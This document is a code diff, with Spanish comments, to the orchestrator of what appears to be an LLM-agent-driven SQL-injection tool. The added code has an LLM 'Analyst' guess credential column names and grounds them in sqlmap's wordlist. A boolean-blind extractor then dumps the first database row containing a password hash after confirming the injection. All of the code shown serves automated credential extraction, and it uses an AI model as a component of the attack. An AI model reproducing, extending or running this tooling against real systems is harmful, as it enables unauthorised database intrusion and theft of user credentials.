@@ -13,6 +13,7 @@ from __future__ import annotations
 import time
 from typing import Callable, Optional
 
+from . import knowledge
 from .agents import Analyst, Executor, Planner
 from .blind import BlindExtractor
 from .discovery import ProbeResult, SchemaDiscovery, pick_credential_columns
@@ -149,15 +150,43 @@ class Orchestrator:
                 return bool(resp.rows)
             return False
 
+        candidates: Optional[tuple[list[str], list[str]]] = None
         for quote in ("", "'"):   # medium = entero (sin comilla); otros = cadena
             bx = BlindExtractor(oracle, quote=quote, say=say)
             if not bx.confirm():
                 continue
             say(f"[Blind] inyección booleana confirmada (comillas={quote!r}); "
                 f"UNION bloqueado → extracción ciega con LIKE")
+            # Candidatos de columna: el Analyst (LLM) los propone y sqlmap los aterriza (una vez).
+            if candidates is None:
+                candidates = self._credential_candidates(say)
+            bx.user_cols, bx.pass_cols = candidates
             row = bx.dump_first_row()
             if row and row.get("hash"):
                 say(f"[Orchestrator] SUCCESS (boolean-blind, {bx.requests} sondeos) — {row}")
                 return row
             return None
         return None
+
+    def _credential_candidates(self, say: Logger) -> tuple[list[str], list[str]]:
+        """Nombres de columnas de credencial para la ruta ciega: el Analyst (LLM) los PROPONE y se
+        ATERRIZAN en la wordlist de sqlmap (solo nombres reales van primero). Respaldo determinista
+        si el LLM no responde."""
+        try:
+            users, passwords = self.analyst.guess_credential_columns()
+        except Exception:
+            users, passwords = [], []
+        wl = {c.lower() for c in knowledge.common_columns()}
+        def ground(names: list[str]) -> list[str]:
+            inwl = [n for n in names if n.lower() in wl]      # nombres del LLM que existen en sqlmap
+            extra = [n for n in names if n.lower() not in wl]  # el resto de lo propuesto por el LLM
+            return inwl + extra
+        users, passwords = ground(users), ground(passwords)
+        if users and passwords:
+            say(f"[Blind] columnas propuestas por el Analyst (LLM), aterrizadas en sqlmap: "
+                f"usuario≈{users[:4]} password≈{passwords[:4]}")
+            return users, passwords
+        # Respaldo determinista: wordlist de sqlmap (o lista mínima si falta el dataset).
+        fu, fp = knowledge.credential_column_candidates()
+        say("[Blind] Analyst sin respuesta → respaldo determinista (wordlist de sqlmap)")
+        return (users or fu), (passwords or fp)
